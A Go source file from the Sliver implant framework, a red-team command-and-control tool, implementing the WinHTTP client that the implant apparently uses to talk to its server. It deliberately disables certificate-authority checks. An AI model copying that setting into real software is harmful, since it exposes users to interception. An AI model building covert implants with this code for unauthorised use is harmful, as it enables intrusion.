//go:build windows

package winhttp

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"strconv"
	"syscall"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
)

// NewWinHTTPClient - Init a new WinHTTPClient
func NewWinHTTPClient(hostname string, port uint16) *WinHTTPClient {
	return &WinHTTPClient{
		hostname: hostname,
		port:     port,
	}
}

// WinHTTPClient - A WinHTTP driver
type WinHTTPClient struct {
	port     uint16
	hostname string

	hSession HInternet

	referrer    string
	acceptTypes []string
}

// Do - Execute an HTTP request
func (w *WinHTTPClient) Do(req *http.Request) (*http.Response, error) {
	var err error
	if w.hSession == 0 {
		// {{if .Config.Debug}}
		log.Printf("[winhttp] starting new session ...")
		// {{end}}
		w.hSession, err = Open(
			req.Header.Get("User-Agent"),
			WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
			"",
			"",
			0,
		)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[winhttp] open failed: %s", err)
			// {{end}}
			return nil, err
		}
	}

	hConnect, err := Connect(w.hSession, w.hostname, int(w.port))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[winhttp] connect failed: %s", err)
		// {{end}}
		return nil, err
	}

	openReqFlags := uint32(0)
	reqPath := fmt.Sprintf("%s?%s", req.URL.Path, req.URL.RawQuery)
	// {{if .Config.Debug}}
	log.Printf("[winhttp] req -> %s", reqPath)
	// {{end}}
	hRequest, err := OpenRequest(hConnect, req.Method, reqPath, "", w.referrer, w.acceptTypes, openReqFlags)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[winhttp] open request failed: %s", err)
		// {{end}}
		return nil, err
	}

	dwFlags := uint32(SECURITY_FLAG_IGNORE_UNKNOWN_CA)
	err = SetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, uintptr(unsafe.Pointer(&dwFlags)), unsafe.Sizeof(dwFlags))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[winhttp] set option failed: %s", err)
		// {{end}}
		return nil, err
	}

	sendReqContext := uint32(0)
	if req.Body != nil {
		var body []byte
		body, err = io.ReadAll(req.Body)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[winhttp] io read body failed: %s", err)
			// {{end}}
			return nil, err
		}
		err = SendRequest(hRequest, "", &body[0], len(body), len(body), &sendReqContext)
	} else {
		err = SendRequest(hRequest, "", nil, 0, 0, &sendReqContext)
	}
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[winhttp] send request failed: %s", err)
		// {{end}}
		return nil, err
	}

	err = ReceiveResponse(hRequest)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[winhttp] recv response failed: %s", err)
		// {{end}}
		return nil, err
	}

	utf16StatusCode := make([]uint16, 16)
	statusCodeSize := uint32(unsafe.Sizeof(uint16(0)) * 16)
	err = QueryHeaders(
		hRequest,
		WINHTTP_QUERY_STATUS_CODE,
		"",
		&utf16StatusCode[0],
		&statusCodeSize,
		nil,
	)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[winhttp] query headers failed: %s", err)
		// {{end}}
		return nil, err
	}
	statusCode, err := strconv.Atoi(syscall.UTF16ToString(utf16StatusCode[:]))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[winhttp] failed to parse utf16 status code: %s", err)
		// {{end}}
		return nil, err
	}

	utf16Status := make([]uint16, 16)
	statusSize := uint32(unsafe.Sizeof(uint16(0)) * 16)
	err = QueryHeaders(
		hRequest,
		WINHTTP_QUERY_STATUS_TEXT,
		"",
		&utf16Status[0],
		&statusSize,
		nil,
	)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[winhttp] query headers failed: %s", err)
		// {{end}}
		return nil, err
	}
	status := syscall.UTF16ToString(utf16Status[:])

	// {{if .Config.Debug}}
	log.Printf("[winhttp] status code: %d", statusCode)
	// {{end}}

	var dataSize uint
	dataSize, err = QueryDataAvailable(hRequest)
	if err != nil {
		return nil, err
	}
	// {{if .Config.Debug}}
	log.Printf("[winhttp] data size: %v", dataSize)
	// {{end}}
	dataBuf := make([]byte, dataSize)
	var bytesRead int
	bytesRead, err = ReadData(
		hRequest,
		dataBuf,
	)
	if err != nil {
		return nil, err
	}
	// {{if .Config.Debug}}
	log.Printf("[winhttp] bytesRead: %v", bytesRead)
	log.Printf("[winhttp] data: %v\n", string(dataBuf))
	// {{else}}
	bytesRead++
	bytesRead--
	// {{end}}

	resp := &http.Response{
		Status:        status,
		StatusCode:    statusCode,
		Proto:         "HTTP/1.1",
		ProtoMajor:    1,
		ProtoMinor:    1,
		Body:          ioutil.NopCloser(bytes.NewReader(dataBuf)),
		ContentLength: int64(dataSize),
		Request:       req,
		Header:        make(http.Header),
	}

	return resp, nil
}
